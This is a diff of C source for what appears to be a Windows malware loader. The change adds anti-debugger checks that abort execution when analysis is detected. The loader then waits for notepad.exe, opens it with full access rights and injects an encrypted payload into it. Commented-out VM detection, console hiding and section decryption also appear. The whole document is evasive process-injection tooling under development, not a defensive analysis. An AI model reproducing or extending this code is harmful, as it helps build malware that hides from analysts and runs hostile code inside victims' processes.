@@ -4,7 +4,8 @@
 #include "config.h"
 #include <time.h>
 #include "low-entropy-payload.h"
-
+//#include "VM-detect.h"
+#include "debugger-detect.h"
 BOOL IsDuplicate()
 {
     DWORD currentpid = GetCurrentProcessId();
@@ -86,7 +87,7 @@ void DecryptRDataSection()
 int main()
 {
     
-    HWND window = GetConsoleWindow();
+    //HWND window = GetConsoleWindow();
     //ShowWindow(window, SW_HIDE);
 
     //DecryptRDataSection();
@@ -104,7 +105,7 @@ int main()
     // // printf("%s\n", logpath);
     // freopen(logpath, "w", stdout);
     // #endif
-
+    //if (Debugger)
     // if (VMDetect())
     // {
     //     #ifdef DEBUG
@@ -119,8 +120,22 @@ int main()
     //     #endif
     // }
 
+    if (CheckDebugPresentBit() || CheckNTGlobalFlag())
+    {
+#ifdef DEBUG
+        printf("[x] Debugger has been detected, operation abort!\n");
+        exit(0);
+#endif
+    }
+    else
+    {
+#ifdef DEBUG
+        printf("[+] No debugger has been detected, operation continue!\n");
+#endif
+    }
+
     #ifdef DEBUG
-        printf("[*] Waiting for notepad.exe\n");
+    printf("[.] Waiting for notepad.exe\n");
     #endif
 
     DWORD targetpid = 0;
@@ -160,9 +175,6 @@ int main()
     HANDLE hProcess = _OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetpid);
     if (hProcess)
     {
-        // PayloadDecrypt(buffer + 0x10, BUFFER_Size, keybuffer + 0x10, KEY_Size);
-        // PayloadReEncrypt(buffer + 0x10, BUFFER_Size);
-        //printf("%d\n", payload[0]);
         InjectPayload(hProcess, payload , BUFFER_Size);
     }
     else
